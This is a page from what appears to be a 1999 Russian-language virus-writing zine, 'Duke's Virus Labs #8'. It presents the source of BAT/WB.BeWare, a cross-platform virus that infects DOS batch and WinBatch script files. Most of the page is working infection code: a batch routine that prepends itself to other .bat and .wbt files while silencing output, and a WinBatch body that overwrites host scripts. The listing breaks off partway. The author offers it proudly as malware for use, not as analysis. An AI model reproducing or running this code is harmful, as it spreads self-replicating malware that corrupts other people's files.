- [Duke's Virus Labs #8] - [Page 20] -

BAT/WB.BeWare aka SMF.BeWare
(c) by Duke/SMF

Имя вируса    : BAT/WB.Simple aka SMF.BeWare
Автор         : Duke/SMF
Язык прогр.   : Windows Interface Language (WinBatch) + DOS Batch Script
Платформа     : DOS/Windows/WinBatch application
Дата создания : 28.07.99

   Первый в мире BAT/WB кросплатформенный вирус, способный поражать BAT и WBT
файлы и, таким образом, живущий под DOS/Win32 - настоящий скриптовый
многоплатформенный вирус. Написан на 2-х языках программирования.
   Для заражения WBT-файлов используется метод вируса WB.Simple из предыдущей
статьи. WBT-часть вируса носит в своем теле в виде массива BAT-часть вируса
и при заражении BAT-файлов записывает ее в начало жертвы. Пораженный BAT-файл
имеет структуру:
           <BAT-тело вируса>
           <полный WB-вирус>
           :RunBeWare
           <пораженный BAT-файл>
           @goto Comon
           :End

   BAT-часть вируса выглядит следующим образом :
=== Cut ===
@REM BeWare
@goto RunBeWare
:Comon %BeWare%
@ctty nul%BeWare%
if ^%1==^BeWareBAT goto BeWareBAT
if ^%1==^BeWareWBT goto BeWareWBT
for %%b in (*.bat) do call %0 BeWareBAT %%b
for %%w in (*.wbt) do call %0 BeWareWBT %%w
del $BeWare$
goto End%BeWare%
:BeWareBAT
find "BeWare"<%2
if not errorlevel 1 goto End%BeWare%
copy %2 $BeWare$
echo.>>$BeWare$
echo @goto Comon>>$BeWare$
echo :End>>$BeWare$
find "BeWare"<%0>%2
type $BeWare$>>%2
goto End%BeWare%
:BeWareWBT
find "BeWare"<%2
if not errorlevel 1 goto End%BeWare%
copy %2 $BeWare$
find "BeWare%BeWare%!"<%0>%2
type $BeWare$>>%2
goto End%BeWare%
:RunBeWare
@goto Comon
:End
=== Cut ===

   А это полное тело вируса в виде WBT-файла :

===== Cut here =====
;BAT/WB.BeWare!
;(c) by Duke/SMF ;BeWare!
IntControl(29, @tab, 0, 0, 0) ;BeWare!
ErrorMode(@OFF) ;BeWare!
Viral = "" ;BeWare!
AllWBT = FileItemize("*.wbt") ;BeWare!
For i = 1 to ItemCount(AllWBT, @tab) ;BeWare!
   OneWBT = ItemExtract(i, AllWBT, @tab) ;BeWare!
   Size=FileSize(OneWBT) ;BeWare!
   MarkBuffer = BinaryAlloc(Size+100) ;BeWare!
   BinaryRead(MarkBuffer, OneWBT) ;BeWare!
   If BinaryPeekStr(MarkBuffer, 0, 15) == ";BAT/WB.BeWare!" then
      Viral = OneWBT ;BeWare!
      Break ;BeWare!
   End If ;BeWare!
Next i ;BeWare!
If Viral != OneWBT Then EXIT ;BeWare!
For w = 1 To ItemCount(AllWBT, @tab) ;BeWare!
   OneWBT = ItemExtract(w, AllWBT, @tab) ;BeWare!
   Size=FileSize(OneWBT) ;BeWare!
   MarkBuffer = BinaryAlloc(Size+100) ;BeWare!
   BinaryRead(MarkBuffer, OneWBT) ;BeWare!
   If BinaryPeekStr(MarkBuffer, 0, 15) == ";BAT/WB.BeWare!" then Goto InfWBT
   FileCopy(OneWBT,"C:\BeWare!",0)
   virus = FileOpen(Viral, "READ") ;BeWare!
   host = FileOpen(OneWBT, "WRITE") ;BeWare!
   While @TRUE ;BeWare!
      x = FileRead(virus) ;BeWare!
      FileWrite(host, x) ;BeWare!
      If x == "EXIT ;BeWare!" Then Break
   EndWhile ;BeWare!
   FileClose(virus) ;BeWare!
   FileClose(host) ;BeWare!
   temp = FileOpen("C:\BeWare!", "READ")
   Size=FileSize("C:\BeWare!")
   MarkBuffer = BinaryAlloc(Size+100) ;BeWare!
   BinaryRead(MarkBuffer, "C:\BeWare!")
   BinaryWriteEx(MarkBuffer, 0, OneWBT, 4194, Size)
   FileDelete(temp) ;BeWare!
:InfWBT ;BeWare!
Next w ;BeWare!
BATBody1 = "@REM BeWare" ;BeWare!
BATBody2 = "@goto RunBeWare" ;BeWare!
BATBody3 = ":Comon %%BeWare%%" ;BeWare!
BATBody4 = "@ctty nul%%BeWare%%" ;BeWare!
BATBody5 = "if ^%%1==^BeWareBAT goto BeWareBAT" ;BeWare!
BATBody6 = "if ^%%1==^BeWareWBT goto BeWareWBT" ;BeWare!
